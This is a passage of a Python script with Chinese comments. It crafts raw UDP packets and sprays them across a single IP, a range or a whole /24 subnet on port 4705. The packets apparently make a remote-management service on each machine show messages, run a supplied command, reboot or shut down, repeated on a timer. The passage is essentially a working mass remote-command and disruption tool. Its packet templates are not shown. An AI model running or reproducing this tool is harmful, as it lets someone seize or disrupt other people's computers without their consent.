# 将要发送的消息打包成完整的指令
def pkg_sendlist(cmdtype, content):
    arrs = format_b4_send(content)
    if cmdtype == '-msg':
        index = 56
        result = basicCMD['-msg']
        for elem in arrs:
            result[index] = elem
            index += 1
        
    elif cmdtype == '-c':
        index = 100
        result = basicCMD['-c']
        for elem in arrs:
            result[index] = elem
            index += 1
    
    s=""
    for i in result:
        s+=str(i)
    return result

# 格式化要发送的消息
def format_b4_send(content):
    arr = []
    for ch in content:
        # print(ch)
        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
        # print(tmp)
        if int(tmp, 16) > 0xff:
            tmp = tmp[2:]
            high = int((tmp[0] + tmp[1]), 16)
            # print((tmp[0] + tmp[1]))
            # print(high)
            low = int((tmp[2] + tmp[3]), 16)
            # print(low)
            arr.append(low)
            arr.append(high)
        else:
            high = 0
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
    return arr





basicCMD = {
        '-msg' : store[0],
        '-c' : store[1],
        '-r' : store[2],
        '-s' :store[3],
    }




# 判断该字符串是否为数字
def judge_is_num(s):
    flag = True
    for n in s:
        if n not in '0123456789':
            flag = False
            break
    return flag



# 获取ip
def get_ip(ip):
    target_host = []
    if ip.find('.') == -1:
        print('\nYou enter a error IP.')
        print("Please enter the correct format of the IP again.")
        exit(0)
    if ip.find('-') != -1 :
        ip_arr = ip.split('-')
        ip_arrs = ip_arr[0].split('.')
        if int(ip_arr[1]) >254:
            ip_arr[1] = '254'
        for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    elif ip.find('/') == -1:
        target_host.append(ip)
    elif ip.find('/24') != -1:
        ip_arr = ip.split('/')
        ip_arrs = ip_arr[0].split('.')
        for i in range(1, 255):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    else:
        print('\nYou enter a error IP.')
        print("Please enter the correct format of the IP again.")
        exit(0)
    return target_host






def creat_send_object(command):#获取信息并且执行
    config = {
        'ip' : '',
        'port' : 4705,
        't' : 22,
        'l' : 1,
    }
    send_list = []

    # 获取ip
    if '-ip' in command:
        config['ip'] = command[command.index('-ip')+1]

    # 获取端口
    if ('-p' in command) :
        if (command[command.index('-p')+1] != ''):
            if judge_is_num(command[command.index('-p')+1]):
                config['port'] = command[command.index('-p')+1]
            else:
                pass
        

    # 获取命令内容

    if '-msg' in command:

        send_list.append(pkg_sendlist('-msg',command[command.index('-msg')+1]))

    if '-c' in command:
        # print(command[int(command.index('-c'))+1])
        send_list.append(pkg_sendlist('-c', command[command.index('-c')+1]))
    if '-r' in command:
        send_list.append(basicCMD['-r'])

    if '-s' in command:
        send_list.append(basicCMD['-s'])


    client = socket(AF_INET, SOCK_DGRAM)
    target_host = get_ip(config['ip'])
    # print(send_list)
    for times in range(config['l']):
        for i in target_host:
            for abc in send_list:
                print(abc)
                payload = pack("%dB" % (len(abc)), *abc)
                print(repr(payload))
                client.sendto(payload, (i, config['port']))
        if config['l'] == 1:
            print("发送成功")        
        else:
            print("第%s次执行完毕" % str(times + 1))
            if times != config['l'] - 1:
                sleep(config['t'])
    


